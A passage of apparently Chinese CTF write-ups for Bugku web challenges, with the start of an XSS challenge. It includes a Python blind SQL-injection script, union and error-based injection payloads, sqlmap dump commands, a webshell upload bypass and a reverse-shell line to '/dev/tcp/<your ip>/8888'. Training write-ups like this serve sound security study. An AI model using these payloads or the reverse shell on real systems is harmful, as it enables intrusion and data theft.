class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>XFF可以注入，过滤了’,’<br>时间盲注，两个trick<br>逗号过滤的情况下可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when xxx then xxx else xxx end</span><br></pre></td></tr></table></figure><p>substr的逗号可以用如下姿势</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from x for 1</span><br></pre></td></tr></table></figure><p>最终可以构造如下payload,注意末尾多一个括号闭合之前的括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&apos;+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #</span><br></pre></td></tr></table></figure><p>上一个最终的注入脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/7/12</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : bugku-insert_into注入</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">data = <span class="string">"127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end)) #"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> mystring:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers = &#123;<span class="string">'x-forwarded-for'</span>: data.format(str(i), j)&#125;</span><br><span class="line">                res = requests.get(url, headers=headers, timeout=<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><blockquote><p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p></blockquote><h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>就双引号注入，都没有过滤什么</p><p>database：bugkusql1 </p><p>table：flag1,whoami </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select database(),2 %23</span><br><span class="line"></span><br><span class="line">admin_name=-1&quot; union select group_concat(table_name) ,2 from information_schema.tables where table_schema = database() %23</span><br><span class="line"></span><br><span class="line">admin_name=-1&quot; union select group_concat(column_name) ,2 from information_schema.columns where table_name= &apos;flag1&apos; %23</span><br><span class="line"></span><br><span class="line">admin_name=-1&quot; union select group_concat(flag1) ,2 from  flag1 %23</span><br></pre></td></tr></table></figure><p>sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;1.txt&quot; -p admin_name --dbs   //爆数据库，注入点为admin_name</span><br><span class="line">sqlmap -r &quot;1.txt&quot; -D bugkusql1 -p admin_name --tables   //爆表</span><br><span class="line">sqlmap -r &quot;1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns   //爆字段</span><br><span class="line">sqlmap -r &quot;1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump   //爆数据</span><br></pre></td></tr></table></figure><blockquote><p>flag{ed6b28e684817d9efcaf802979e57aea }</p></blockquote><h2 id="login3"><a href="#login3" class="headerlink" title="login3"></a>login3</h2><p>bool盲注</p><p><a href="https://doubler.cn/2018/04/27/BugKuCTF-Login3/" target="_blank" rel="noopener">https://doubler.cn/2018/04/27/BugKuCTF-Login3/</a></p><h2 id="PHP-encrypt-1"><a href="#PHP-encrypt-1" class="headerlink" title="PHP_encrypt_1"></a>PHP_encrypt_1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><blockquote><p><a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">http://103.238.227.13:10088/</a> </p><p>FLAG格式 Flag:”” </p></blockquote><blockquote><p>~3C3F706870206664736166617366647361666964736166647361696664736 616B6664736169666473616664736166664736166647361666B6473613B666 6473616664736166736461666473616 66617330686664736739466C61673A2 223732343966356137666431646536 </p><p>303262333065366633396165613631</p><p>393361226673646166736166647361 </p><p> 66647361666473616661203F3E0A </p></blockquote><blockquote><p>Flag:”7249f5a7fd1de602b30e6f39aea6193a”</p></blockquote><p><a href="https://blog.csdn.net/qq_33417843/article/details/79766318" target="_blank" rel="noopener">Bugku ctf writeup–web篇–报错注入</a></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html</a></p><p><a href="http://blkstone.github.io/2017/11/09/updatexml-sqli/" target="_blank" rel="noopener">MySQL updatexml()、extractvalue() 报错型SQL注入</a></p><p><a href="http://www.cnblogs.com/joy-nick/p/5774462.html" target="_blank" rel="noopener">http://www.cnblogs.com/joy-nick/p/5774462.html</a></p><p><a href="http://skysec.top/2017/07/19/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7%E5%8E%9F%E7%90%86/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener">sql注入的一些技巧原理</a></p><h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><blockquote><p><a href="http://118.89.219.210:49166/" target="_blank" rel="noopener">http://118.89.219.210:49166/</a> </p><p>flag格式：SKCTF{xxxxxxxxxxxxxxxx} </p><p>hint:文件包含 </p></blockquote><p>writeup来自<a href="https://delcoding.github.io/2018/03/bugku-writeup4/" target="_blank" rel="noopener">https://delcoding.github.io/2018/03/bugku-writeup4/</a></p><p>打开题目，在源代码中发现了<code>upload.php</code></p><p><img src="https://delcoding.github.io/images/posts/bugku/68.png" alt="img"> </p><p>  访问后发现是文件上传，但是只支持图片文件，不够这里没关系，不用考虑怎么绕过，因为文件包含的时候会使用<code>php</code>解析：</p><p><img src="https://delcoding.github.io/images/posts/bugku/69.png" alt="img"> </p><p>  上传一句话</p><p><img src="https://delcoding.github.io/images/posts/bugku/70.png" alt="img"> </p><p><img src="https://delcoding.github.io/images/posts/bugku/71.png" alt="img"> </p><p>  但是访问后发现存在过滤，<code>&lt;?php</code>被替换成<code>_</code>。如下图：</p><p><img src="https://delcoding.github.io/images/posts/bugku/72.png" alt="img"> </p><p>  但是我们可以使用<code>&lt;script language=php&gt; &lt;/script&gt;</code>标签绕过这个验证，我们再上传一次：</p><p><img src="https://delcoding.github.io/images/posts/bugku/73.png" alt="img"> </p><p><img src="https://delcoding.github.io/images/posts/bugku/74.png" alt="img"> </p><p>  可以看到，后台已经成功的解析了我们的<code>php代码</code>。接着使用菜刀连接。 </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527762752303.png" alt="1527762752303"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527762738245.png" alt="1527762738245"></p><p>打开文件即可拿到flag</p><blockquote><p>SKCTF{uP104D_1nclud3_426fh8_is_Fun}</p></blockquote><h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><blockquote><p><a href="http://118.89.219.210:49165/" target="_blank" rel="noopener">http://118.89.219.210:49165/</a><br>SKCTF{xxxxxxxxxxxxxxxxxxxxx}<br>hint:union，命令执行</p></blockquote><p>对请求抓包，然后可以发现<code>tip</code>，解密出来是几行代码。</p><p><img src="https://delcoding.github.io/images/posts/bugku/104.png" alt="img"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这里可以看到它是分离式的验证，首先查询<code>username</code>的用户，然后拿出<code>password</code>再进行比较，一开始想着是注入出<code>admin</code>的密码，但发现可能没有这个用户，而且也找不到注入的<code>poc</code>。后来参考网上的writeup才知道正确的打开方式。payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; union select md5(1),md5(1)#&amp;password=1</span><br></pre></td></tr></table></figure><p>  执行这条语句时由于前面的<code>username</code>为空，所以没有数据返回，但后面的<code>union select md5(1),md5(1)</code>则会返回两个MD5(1)的值，然后<code>password</code>我们也置为<code>1</code>，从而绕过<code>if</code>语句的判断。</p><p>  接下来可以进入命令执行的页面。</p><p><img src="https://delcoding.github.io/images/posts/bugku/105.png" alt="img"> </p><p>  然后我们反弹回一个shell来方便我们操作。我们先在本地监听一下，这里使用nc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvv 8888</span><br></pre></td></tr></table></figure><p>  然后执行反弹shell的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/你的公网ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>  最后就能在服务器上收到shell，然后查询flag。</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527776289893.png" alt="1527776289893"></p><blockquote><p>SKCTF{Uni0n_@nd_c0mM4nD_exEc}</p></blockquote><p><a href="https://www.cnblogs.com/blili/p/9045280.html" target="_blank" rel="noopener">bugku login2 writeup 不使用vps的方法</a></p><p><a href="http://www.bugku.com/thread-80-1-1.html" target="_blank" rel="noopener">bugku平台 login2 writeup</a></p><p><a href="https://www.anquanke.com/post/id/85712" target="_blank" rel="noopener">Linux渗透之反弹Shell命令解析</a></p><p><a href="http://www.myh0st.cn/index.php/archives/237/" target="_blank" rel="noopener">linux下反弹shell的姿势</a></p><p><a href="https://www.bandwagonhost.net/399.html" target="_blank" rel="noopener">vps登录ssh</a></p><h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><blockquote><p><a href="http://120.24.86.145:9002/" target="_blank" rel="noopener">http://120.24.86.145:9002/</a> </p><p>hints：不要一次就放弃 </p></blockquote><p>注册一个用户，但是不知道id</p><p>后来用扫描器扫一扫</p><p>发现show.php</p><p>show.php即可发现flag</p><blockquote><p>flag1:{0/m9o9PDtcSyu7Tt} </p></blockquote><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><blockquote><p>地址：<a href="http://120.24.86.145:8002/flagphp/" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/</a></p><p>点了login咋没反应</p><p>提示：hint</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class="container" align="center"&gt;</span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{unserialize_by_virink}</p></blockquote><h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>这里学到一种新的注入方式异或注入 </p><p> id后面输入 <code>1’^(0)^’</code>，此时页面正常返回，如果换一下 <code>‘^(1)^’</code>，此时则会返回错误，那么接下来我们就可以试一下页面究竟过滤了那些关键字。</p><p>比如 <code>1’^(length(‘select’)=6)^’</code>  测试这个<code>select</code>应该是被过滤的了，实现的语句应该是<code>id=1&#39;^0^0</code>,有过滤返回正确，而无过滤的时候就会返回错误  测试得到以下关键字被过滤 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union,select,and,or</span><br></pre></td></tr></table></figure><p>尝试一下是否可以双写绕过</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366090308.png" alt="1531366090308"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366077987.png" alt="1531366077987"></p><p>可以绕过，然后就是常规操作了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; uunionnion selecselectt 1,2 %23</span><br><span class="line"></span><br><span class="line">?id=-1&apos; uunionnion selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where  table_schema = database()%23</span><br><span class="line"></span><br><span class="line">?id=-1&apos; uunionnion selecselectt 1,group_concat(column_name) from infoorrmation_schema.columns where  table_schema = database()%23</span><br><span class="line"></span><br><span class="line">?id=-1&apos; uunionnion selecselectt 1,group_concat(flag1,&apos;-----&apos;,address) from flag1%23</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366477264.png" alt="1531366477264"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366544753.png" alt="1531366544753"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366968042.png" alt="1531366968042"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366990699.png" alt="1531366990699"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366793474.png" alt="1531366793474"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531367083835.png" alt="1531367083835"></p><p>payload</p><blockquote><p><a href="http://120.24.86.145:9004/1ndex.php?id=1&#39;" target="_blank" rel="noopener">http://120.24.86.145:9004/1ndex.php?id=1&#39;</a> anandd 1=2 uniounionn selecselectt 1,flag1 from flag1%23</p></blockquote><p>假的flag</p><blockquote><p>usOwycTju+FTUUzXosjr </p></blockquote><p>第二关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select limit from and or where if sleep substr ascii</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My Id =1&apos; select limit from and or where if ascii</span><br></pre></td></tr></table></figure><p>过滤了union ，sleep，substr</p><p>有回显，而且过滤了union，双写不能绕过，可以试一下报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x0a,(select database()),0x0a),1)%23</span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=flag2),0x7e),1)%23</span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x0a,(select database()),0x0a))%23</span><br><span class="line"></span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x0a))%23</span><br><span class="line"></span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag2&apos;),0x0a))%23</span><br><span class="line"></span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(flag2,address) from flag2),0x0a))%23</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531385520901.png" alt="1531385520901"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531385615843.png" alt="1531385615843"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531385664757.png" alt="1531385664757"></p><p>flag</p><blockquote><p>flag{bugku-sql_6s-2i-4t-bug} </p></blockquote><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>一是通过异或注入判断过滤的关键字，二是在union被过滤的情况之下要想到报错注入的方式 </p><p>参考</p><p><a href="https://blog.csdn.net/u011377996/article/details/79340100#t17" target="_blank" rel="noopener">https://blog.csdn.net/u011377996/article/details/79340100#t17</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;慢慢刷了这么多题目，需要总结一下&lt;/p&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="web" scheme="http://blog.Lhaihai.wang/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XSSTV挑战赛</title>
    <link href="http://blog.Lhaihai.wang/2018/07/10/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://blog.Lhaihai.wang/2018/07/10/XSSTV挑战赛/</id>
    <published>2018-07-10T13:11:11.000Z</published>
    <updated>2018-07-16T10:46:46.131Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/index.png" alt="img"> </p><h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p>​    <a href="http://test.xss.tv" target="_blank" rel="noopener">http://test.xss.tv</a></p><p>​    也可以自己搭在本地搭建</p><p>​    链接: <a href="https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw" target="_blank" rel="noopener">https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw</a> 密码: akvp</p><h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><p>​    firefox   61版本</p><p>​    chrome 67版本</p><p>​    burpsuite</p><a id="more"></a><h3 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h3><h3 id="判断核心字符是否被过滤"><a href="#判断核心字符是否被过滤" class="headerlink" title="判断核心字符是否被过滤"></a>判断核心字符是否被过滤</h3><p>关键字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;, &gt; # 构造标签</span><br><span class="line">&quot;, &apos; # 闭合属性</span><br><span class="line">&amp;, #, ; # HTML16编码</span><br></pre></td></tr></table></figure><h4 id="绕过的思路"><a href="#绕过的思路" class="headerlink" title="绕过的思路"></a>绕过的思路</h4><ol><li>大小写混淆</li><li>递归构造</li></ol><h3 id="辅助挖掘"><a href="#辅助挖掘" class="headerlink" title="辅助挖掘"></a>辅助挖掘</h3><p>判断过滤payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;&quot;&apos;zxcv # 还可以加上宽字节</span><br><span 